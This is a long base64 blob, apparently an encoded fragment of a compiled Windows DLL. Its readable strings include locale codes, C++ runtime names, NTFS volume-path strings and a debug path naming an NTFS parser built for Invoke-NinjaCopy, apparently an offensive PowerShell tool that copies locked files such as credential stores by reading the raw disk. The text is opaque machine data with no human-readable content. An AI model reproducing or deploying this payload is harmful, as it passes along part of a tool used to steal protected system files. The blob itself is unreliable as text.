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AC0ATABhAHQAbgAAAAAAZQB1AC0ARQBTAAAAbQBrAC0ATQBLAAAAdABuAC0AWgBBAAAAeABoAC0AWgBBAAAAegB1AC0AWgBBAAAAYQBmAC0AWgBBAAAAawBhAC0ARwBFAAAAZgBvAC0ARgBPAAAAaABpAC0ASQBOAAAAbQB0AC0ATQBUAAAAcwBlAC0ATgBPAAAAbQBzAC0ATQBZAAAAawBrAC0ASwBaAAAAawB5AC0ASwBHAAAAcwB3AC0ASwBFAAAAdQB6AC0AVQBaAC0ATABhAHQAbgAAAAAAdAB0AC0AUgBVAAAAYgBuAC0ASQBOAAAAcABhAC0ASQBOAAAAZwB1AC0ASQBOAAAAdABhAC0ASQBOAAAAdABlAC0ASQBOAAAAawBuAC0ASQBOAAAAbQBsAC0ASQBOAAAAbQByAC0ASQBOAAAAcwBhAC0ASQBOAAAAbQBuAC0ATQBOAAAAYwB5AC0ARwBCAAAAZwBsAC0ARQBTAAAAawBvAGsALQBJAE4AAAAAAHMAeQByAC0AUwBZAAAAAABkAGkAdgAtAE0AVgAAAAAAcQB1AHoALQBCAE8AAAAAAG4AcwAtAFoAQQAAAG0AaQAtAE4AWgAAAGEAcgAtAEkAUQAAAGQAZQAtAEMASAAAAGUAbgAtAEcAQgAAAGUAcwAtAE0AWAAAAGYAcgAtAEIARQAAAGkAdAAtAEMASAAAAG4AbAAtAEIARQAAAG4AbgAtAE4ATwAAAHAAdAAtAFAAVAAAAHMAcgAtAFMAUAAtAEwAYQB0AG4AAAAAAHMAdgAtAEYASQAAAGEAegAtAEEAWgAtAEMAeQByAGwAAAAAAHMAZQAtAFMARQAAAG0AcwAtAEIATgAAAHUAegAtAFUAWgAtAEMAeQByAGwAAAAAAHEAdQB6AC0ARQBDAAAAAABhAHIALQBFAEcAAAB6AGgALQBIAEsAAABkAGUALQBBAFQAAABlAG4ALQBBAFUAAABlAHMALQBFAFMAAABmAHIALQBDAEEAAABzAHIALQBTAFAALQBDAHkAcgBsAAAAAABzAGUALQBGAEkAAABxAHUAegAtAFAARQAAAAAAYQByAC0ATABZAAAAegBoAC0AUwBHAAAAZABlAC0ATABVAAAAZQBuAC0AQwBBAAAAZQBzAC0ARwBUAAAAZgByAC0AQwBIAAAAaAByAC0AQgBBAAAAcwBtAGoALQBOAE8AAAAAAGEAcgAtAEQAWgAAAHoAaAAtAE0ATwAAAGQAZQAtAEwASQAAAGUAbgAtAE4AWgAAAGUAcwAtAEMAUgAAAGYAcgAtAEwAVQAAAGIAcwAtAEIAQQAtAEwAYQB0AG4AAAAAAHMAbQBqAC0AUwBFAAAAAABhAHIALQBNAEEAAABlAG4ALQBJAEUAAABlAHMALQBQAEEAAABmAHIALQBNAEMAAABzAHIALQBCAEEALQBMAGEAdABuAAAAAABzAG0AYQAtAE4ATwAAAAAAYQByAC0AVABOAAAAZQBuAC0AWgBBAAAAZQBzAC0ARABPAAAAcwByAC0AQgBBAC0AQwB5AHIAbAAAAAAAcwBtAGEALQBTAEUAAAAAAGEAcgAtAE8ATQAAAGUAbgAtAEoATQAAAGUAcwAtAFYARQAAAHMAbQBzAC0ARgBJAAAAAABhAHIALQBZAEUAAABlAG4ALQBDAEIAAABlAHMALQBDAE8AAABzAG0AbgAtAEYASQAAAAAAYQByAC0AUwBZAAAAZQBuAC0AQgBaAAAAZQBzAC0AUABFAAAAYQByAC0ASgBPAAAAZQBuAC0AVABUAAAAZQBzAC0AQQBSAAAAYQByAC0ATABCAAAAZQBuAC0AWgBXAAAAZQBzAC0ARQBDAAAAYQByAC0ASwBXAAAAZQBuAC0AUABIAAAAZQBzAC0AQwBMAAAAYQByAC0AQQBFAAAAZQBzAC0AVQBZAAAAYQByAC0AQgBIAAAAZQBzAC0AUABZAAAAYQByAC0AUQBBAAAAZQBzAC0AQgBPAAAAZQBzAC0AUwBWAAAAZQBzAC0ASABOAAAAZQBzAC0ATgBJAAAAZQBzAC0AUABSAAAAegBoAC0AQwBIAFQAAAAAAHMAcgAAAAAAYQBmAC0AegBhAAAAYQByAC0AYQBlAAAAYQByAC0AYgBoAAAAYQByAC0AZAB6AAAAYQByAC0AZQBnAAAAYQByAC0AaQBxAAAAYQByAC0AagBvAAAAYQByAC0AawB3AAAAYQByAC0AbABiAAAAYQByAC0AbAB5AAAAYQByAC0AbQBhAAAAYQByAC0AbwBtAAAAYQByAC0AcQBhAAAAYQByAC0AcwBhAAAAYQByAC0AcwB5AAAAYQByAC0AdABuAAAAYQByAC0AeQBlAAAAYQB6AC0AYQB6AC0AYwB5AHIAbAAAAAAAYQB6AC0AYQB6AC0AbABhAHQAbgAAAAAAYgBlAC0AYgB5AAAAYgBnAC0AYgBnAAAAYgBuAC0AaQBuAAAAYgBzAC0AYgBhAC0AbABhAHQAbgAAAAAAYwBhAC0AZQBzAAAAYwBzAC0AYwB6AAAAYwB5AC0AZwBiAAAAZABhAC0AZABrAAAAZABlAC0AYQB0AAAAZABlAC0AYwBoAAAAZABlAC0AZABlAAAAZABlAC0AbABpAAAAZABlAC0AbAB1AAAAZABpAHYALQBtAHYAAAAAAGUAbAAtAGcAcgAAAGUAbgAtAGEAdQAAAGUAbgAtAGIAegAAAGUAbgAtAGMAYQAAAGUAbgAtAGMAYgAAAGUAbgAtAGcAYgAAAGUAbgAtAGkAZQAAAGUAbgAtAGoAbQAAAGUAbgAtAG4AegAAAGUAbgAtAHAAaAAAAGUAbgAtAHQAdAAAAGUAbgAtAHUAcwAAAGUAbgAtAHoAYQAAAGUAbgAtAHoAdwAAAGUAcwAtAGEAcgAAAGUAcwAtAGIAbwAAAGUAcwAtAGMAbAAAAGUAcwAtAGMAbwAAAGUAcwAtAGMAcgAAAGUAcwAtAGQAbwAAAGUAcwAtAGUAYwAAAGUAcwAtAGUAcwAAAGUAcwAtAGcAdAAAAGUAcwAtAGgAbgAAAGUAcwAtAG0AeAAAAGUAcwAtAG4AaQAAAGUAcwAtAHAAYQAAAGUAcwAtAHAAZQAAAGUAcwAtAHAAcgAAAGUAcwAtAHAAeQAAAGUAcwAtAHMAdgAAAGUAcwAtAHUAeQAAAGUAcwAtAHYAZQAAAGUAdAAtAGUAZQAAAGUAdQAtAGUAcwAAAGYAYQAtAGkAcgAAAGYAaQAtAGYAaQAAAGYAbwAtAGYAbwAAAGYAcgAtAGIAZQAAAGYAcgAtAGMAYQAAAGYAcgAtAGMAaAAAAGYAcgAtAGYAcgAAAGYAcgAtAGwAdQAAAGYAcgAtAG0AYwAAAGcAbAAtAGUAcwAAAGcAdQAtAGkAbgAAAGgAZQAtAGkAbAAAAGgAaQAtAGkAbgAAAGgAcgAtAGIAYQAAAGgAcgAtAGgAcgAAAGgAdQAtAGgAdQAAAGgAeQAtAGEAbQAAAGkAZAAtAGkAZAAAAGkAcwAtAGkAcwAAAGkAdAAtAGMAaAAAAGkAdAAtAGkAdAAAAGoAYQAtAGoAcAAAAGsAYQAtAGcAZQAAAGsAawAtAGsAegAAAGsAbgAtAGkAbgAAAGsAbwBrAC0AaQBuAAAAAABrAG8ALQBrAHIAAABrAHkALQBrAGcAAABsAHQALQBsAHQAAABsAHYALQBsAHYAAABtAGkALQBuAHoAAABtAGsALQBtAGsAAABtAGwALQBpAG4AAABtAG4ALQBtAG4AAABtAHIALQBpAG4AAABtAHMALQBiAG4AAABtAHMALQBtAHkAAABtAHQALQBtAHQAAABuAGIALQBuAG8AAABuAGwALQBiAGUAAABuAGwALQBuAGwAAABuAG4ALQBuAG8AAABuAHMALQB6AGEAAABwAGEALQBpAG4AAABwAGwALQBwAGwAAABwAHQALQBiAHIAAABwAHQALQBwAHQAAABxAHUAegAtAGIAbwAAAAAAcQB1AHoALQBlAGMAAAAAAHEAdQB6AC0AcABlAAAAAAByAG8ALQByAG8AAAByAHUALQByAHUAAABzAGEALQBpAG4AAABzAGUALQBmAGkAAABzAGUALQBuAG8AAABzAGUALQBzAGUAAABzAGsALQBzAGsAAABzAGwALQBzAGkAAABzAG0AYQAtAG4AbwAAAAAAcwBtAGEALQBzAGUAAAAAAHMAbQBqAC0AbgBvAAAAAABzAG0AagAtAHMAZQAAAAAAcwBtAG4ALQBmAGkAAAAAAHMAbQBzAC0AZgBpAAAAAABzAHEALQBhAGwAAABzAHIALQBiAGEALQBjAHkAcgBsAAAAAABzAHIALQBiAGEALQBsAGEAdABuAAAAAABzAHIALQBzAHAALQBjAHkAcgBsAAAAAABzAHIALQBzAHAALQBsAGEAdABuAAAAAABzAHYALQBmAGkAAABzAHYALQBzAGUAAABzAHcALQBrAGUAAABzAHkAcgAtAHMAeQAAAAAAdABhAC0AaQBuAAAAdABlAC0AaQBuAAAAdABoAC0AdABoAAAAdABuAC0AegBhAAAAdAByAC0AdAByAAAAdAB0AC0AcgB1AAAAdQBrAC0AdQBhAAAAdQByAC0AcABrAAAAdQB6AC0AdQB6AC0AYwB5AHIAbAAAAAAAdQB6AC0AdQB6AC0AbABhAHQAbgAAAAAAdgBpAC0AdgBuAAAAeABoAC0AegBhAAAAegBoAC0AYwBoAHMAAAAAAHoAaAAtAGMAaAB0AAAAAAB6AGgALQBjAG4AAAB6AGgALQBoAGsAAAB6AGgALQBtAG8AAAB6AGgALQBzAGcAAAB6AGgALQB0AHcAAAB6AHUALQB6AGEAAADYNAEQ5DQBEOw0ARD4NAEQBDUBEBA1ARAcNQEQKDUBEDA1ARA4NQEQRDUBEFA1ARBaNQEQCDoBEBw6ARA4OgEQTDoBEGw6ARBcNQEQZDUBEGw1ARBwNQEQdDUBEHg1ARB8NQEQgDUBEIQ1ARCINQEQlDUBEJg1ARCcNQEQoDUBEKQ1ARCoNQEQrDUBELA1ARC0NQEQuDUBELw1ARDANQEQxDUBEMg1ARDMNQEQ0DUBENQ1ARDYNQEQ3DUBEOA1ARDkNQEQ6DUBEOw1ARDwNQEQ9DUBEPg1ARD8NQEQADYBEAQ2ARAINgEQDDYBEBA2ARAcNgEQKDYBEDA2ARA8NgEQVDYBEGA2ARB0NgEQlDYBELQ2ARDUNgEQ9DYBEBQ3ARA4NwEQVDcBEHg3ARCYNwEQwDcBENw3ARDsNwEQ8DcBEPg3ARAIOAEQLDgBEDQ4ARBAOAEQUDgBEGw4ARCMOAEQtDgBENw4ARAEOQEQMDkBEEw5ARBwOQEQlDkBEMA5ARDsOQEQWjUBEF9fYmFzZWQoAAAAAF9fY2RlY2wAX19wYXNjYWwAAAAAX19zdGRjYWxsAAAAX190aGlzY2FsbAAAX19mYXN0Y2FsbAAAX19jbHJjYWxsAAAAX19lYWJpAABfX3B0cjY0AF9fcmVzdHJpY3QAAF9fdW5hbGlnbmVkAHJlc3RyaWN0KAAAACBuZXcAAAAAIGRlbGV0ZQA9AAAAPj4AADw8AAAhAAAAPT0AACE9AABbXQAAb3BlcmF0b3IAAAAALT4AACoAAAArKwAALS0AAC0AAAArAAAAJgAAAC0+KgAvAAAAJQAAADwAAAA8PQAAPgAAAD49AAAsAAAAKCkAAH4AAABeAAAAfAAAACYmAAB8fAAAKj0AACs9AAAtPQAALz0AACU9AAA+Pj0APDw9ACY9AAB8PQAAXj0AAGB2ZnRhYmxlJwAAAGB2YnRhYmxlJwAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAYGxvY2FsIHN0YXRpYyBndWFyZCcAAAAAYHN0cmluZycAAAAAYHZiYXNlIGRlc3RydWN0b3InAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAIGRlbGV0ZVtdAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAIFR5cGUgRGVzY3JpcHRvcicAAAAgQmFzZSBDbGFzcyBEZXNjcmlwdG9yIGF0ICgAIEJhc2UgQ2xhc3MgQXJyYXknAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgAGgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAFAAUABAAEAAQABAAEAAUABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/QQAAABcAAABDAE8ATgBPAFUAVAAkAAAABoCAhoCBgAAAEAOGgIaCgBQFBUVFRYWFhQUAADAwgFCAiAAIACgnOFBXgAAHADcwMFBQiAAAACAogIiAgAAAAGBoYGhoaAgIB3hwcHdwcAgIAAAIAAgABwgAAABnZW5lcmljAHVua25vd24gZXJyb3IAAABpb3N0cmVhbQAAAABpb3N0cmVhbSBzdHJlYW0gZXJyb3IAAABzeXN0ZW0AAGludmFsaWQgc3RyaW5nIHBvc2l0aW9uAHN0cmluZyB0b28gbG9uZwBcXC5cJWM6AE5URlMgICAgAAAAAJxOARBwTgAQgBcAEJAXABCwFwAQsE4BEABOABBwHQAQgB0AELAdABDsTgEQkE0AEIAXABCQFwAQsBcAEABPARDwTAAQcB0AEIAdABCwHQAQxE4BEOAWABCAFwAQkBcAELAXABDYTgEQ8BgAEHAdABCAHQAQsB0AEBRPARDwRAAQGFABEMBEABAsUAEQkEQAEEBQARBgRAAQaFABENA8ABBUUAEQQC0AEChPARDwGAAQcB0AEIAdABCwHQAQPE8BEKhOABBQTwEQwCgAEIAXABCQFwAQsBcAEGRPARCgJwAQfFABECAnABB4TwEQYCUAEIAXABCQFwAQsBcAEIxPARDgFgAQgBcAEJAXABCwFwAQoE8BELBOABC0TwEQoCMAEIAXABCQFwAQsBcAEMhPARDgHwAQ3E8BEOAWABCAFwAQkBcAELAXABDwTwEQ8BgAEHAdABCAHQAQsB0AEARQARDgFgAQgBcAEJAXABCwFwAQkFABEOAWABD+VwAQ/lcAEP5XABBIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAcAEQsFABEBcAAABSU0RTKhjahWztyU+JA8UQjfEHSAEAAABDOlxHaXRodWJcUG93ZXJTaGVsbFxJbnZva2UtTmluamFDb3B5XE5URlNQYXJzZXJcUmVsZWFzZVxOVEZTUGFyc2VyRExMLnBkYgAAAAAAAI0AAACNAAAAAAAAABxwARAAAAAAAAAAAP////8AAAAAQAAAAOBFARAAAAAAAAAAAAEAAADwRQEQxEUBEAAAAAAAAAAAAAAAAAAAAAAAcAEQDEYBEAAAAAAAAAAAAgAAABxGARAoRgEQxEUBEAAAAAAAcAEQAQAAAAAAAAD/////AAAAAEAAAAAMRgEQAAAAAAAAAAAAAAAAOHABEFhGARAAAAAAAAAAAAIAAABoRgEQdEYBEMRFARAAAAAAOHABEAEAAAAAAAAA/////wAAAABAAAAAWEYBEAAAAAAAAAAAAAAAAFhwARCkRgEQAAAAAAAAAAADAAAAtEYBEMRGARB0RgEQxEUBEAAAAABYcAEQAgAAAAAAAAD/////AAAAAEAAAACkRgEQAAAAAAAAAAAAAAAAeHABEPRGARAAAAAAAAAAAAMAAAAERwEQFEcBEHRGARDERQEQAAAAAHhwARACAAAAAAAAAP////8AAAAAQAAAAPRGARAAAAAAAAAAAAAAAACgcAEQREcBEAAAAAAAAAAAAQAAAFRHARBcRwEQAAAAAKBwARAAAAAAAAAAAP////8AAAAAQAAAAERHARAAAAAAAAAAAAAAAAAccAEQ4EUBEAAAAAAAAAAAAAAAAPB5ARCgRwEQAAAAAAAAAAACAAAAsEcBELxHARDERQEQAAAAAPB5ARABAAAAAAAAAP////8AAAAAQAAAAKBHARAAAAAAAAAAAAEAAACYSAEQyH4BEAAAAAAAAAAA/////wAAAABAAAAA2EcBEAAAAAAAAAAAAwAAABRIARCgSAEQOEgBEOhHARAAAAAAAAAAAAAAAAAAAAAA7H4BEOxIARDsfgEQAQAAAAAAAAD/////AAAAAEAAAADsSAEQcH4BEAIAAAAAAAAA/////wAAAABAAAAAvEgBEAAAAAAAAAAAAAAAAMh+ARDYRwEQAAAAAAAAAAAAAAAAcH4BELxIARDoRwEQAAAAAJx+ARACAAAAAAAAAP////8AAAAAQAAAAARIARAAAAAAAAAAAAMAAAD8SAEQAAAAAAAAAAAAAAAAnH4BEARIARA4SAEQ6EcBEAAAAAAAAAAAAAAAAAIAAADgSAEQVEgBEDhIARDoRwEQAAAAAERKARAgTAEQAE0BEAAAAABgSgEQBEwBEABNARAAAAAAfEoBECBMARAATQEQAAAAAJhKARAETAEQAE0BEAAAAAC0SgEQIEwBEABNARAAAAAA0EoBEARMARAATQEQAAAAAOxKARAAAAAACEsBEARMARAATQEQAAAAAEBLARAgTAEQAE0BECRLARAAAAAAXEsBEDxMARAAAAAAeEsBECBMARAATQEQAAAAAJRLARAgTAEQAE0BEAAAAADMSwEQIEwBEABNARCwSwEQAAAAAOhLARAgTAEQAE0BEAAAAAAETAEQAE0BEAAAAAAgTAEQAE0BEAAAAAA8TAEQAAAAAFhMARAAAAAAdEwBEAAAAACQTAEQAAAAAKxMARAAAAAAyEwBEORMARAAAAAA5EwBEAAAAAAATQEQAAAAABh/ARACAAAAAAAAAP////8AAAAAQAAAABxNARBIfwEQAgAAAAAAAAD/////AAAAAEAAAAAsTQEQfH8BEAIAAAAAAAAA/////wAAAABAAAAAPE0BEKh/ARACAAAAAAAAAP////8AAAAAQAAAAExNARDYfwEQAgAAAAAAAAD/////AAAAAEAAAABcTQEQCIABEAIAAAAAAAAA/////wAAAABAAAAAbE0BEDyAARAAAAAAAAAAAP////8AAAAAQAAAAHxNARBkgAEQAgAAAAAAAAD/////AAAAAEAAAACMTQEQcIEBEAAAAAAoAAAA/////wAAAABAAAAAHE4BEISAARADAAAAAAAAAP////8AAAAAQAAAAJxNARCkgAEQAQAAAAAAAAD/////AAAAAEAAAACsTQEQwIABEAIAAAAAAAAA/////wAAAABAAAAAvE0BENyAARACAAAAAAAAAP////8AAAAAQAAAAMxNARAgggEQAAAAACgAAAD/////AAAAAEAAAABsTgEQ+IABEAMAAAAAAAAA/////wAAAABAAAAA3E0BEBiBARACAAAAAAAAAP////8AAAAAQAAAAOxNARA0gQEQAQAAAAAAAAD/////AAAAAEAAAAD8TQEQVIEBEAEAAAAAAAAA/////wAAAABAAAAADE4BEHCBARAAAAAAAAAAAP////8AAAAAQAAAABxOARCYgQEQAAAAAAAAAAD/////AAAAAEA